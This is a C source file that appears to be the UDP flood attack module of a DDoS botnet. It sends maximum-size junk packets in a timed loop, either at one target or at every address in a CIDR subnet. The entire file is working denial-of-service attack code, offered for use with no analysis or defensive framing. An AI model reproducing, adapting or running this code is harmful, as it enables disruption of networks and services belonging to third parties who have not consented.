#define _GNU_SOURCE
#include "headers/udpplain_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

void* udpplain_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    if (params->psize <= 0 || params->psize > 1450) {
        params->psize = 1450;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // No generic checksum, no checksum,+20% Faster
    if (fd < 0) return NULL;

    char *data = malloc(params->psize);
    if (!data) {
        close(fd);
        return NULL;
    }

    memset(data, 0xFF, params->psize);
    time_t end_time = time(NULL) + params->duration;

    if (params->cidr > 0) {
        // subnet mode
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in target = params->target_addr;
        while (time(NULL) < end_time && params->active) {
            if (params->cidr == 32) {
                target.sin_addr.s_addr = htonl(start);
                sendto(fd, data, params->psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
            } else if (params->cidr == 31) {
                // useless check but i already wrote, time wasting to delete
                //doesn't hurt
                // /31: both start and end are usable (RFC 3021)
                target.sin_addr.s_addr = htonl(start);
                sendto(fd, data, params->psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
                target.sin_addr.s_addr = htonl(end);
                sendto(fd, data, params->psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) { // skip network and broadcast
                    target.sin_addr.s_addr = htonl(ip);
                    sendto(fd, data, params->psize, MSG_NOSIGNAL,
                           (struct sockaddr *)&target, sizeof(target));
                }
            }
        }
    } else {
        // single IP mode (classic)
        //timestamp: 2025-6-25 3:50 gmt+3
        while (time(NULL) < end_time && params->active) {
            sendto(fd, data, params->psize, MSG_NOSIGNAL,
                   (struct sockaddr *)&params->target_addr, sizeof(params->target_addr));
        }
    }

    close(fd);
    free(data);
    return NULL;
}
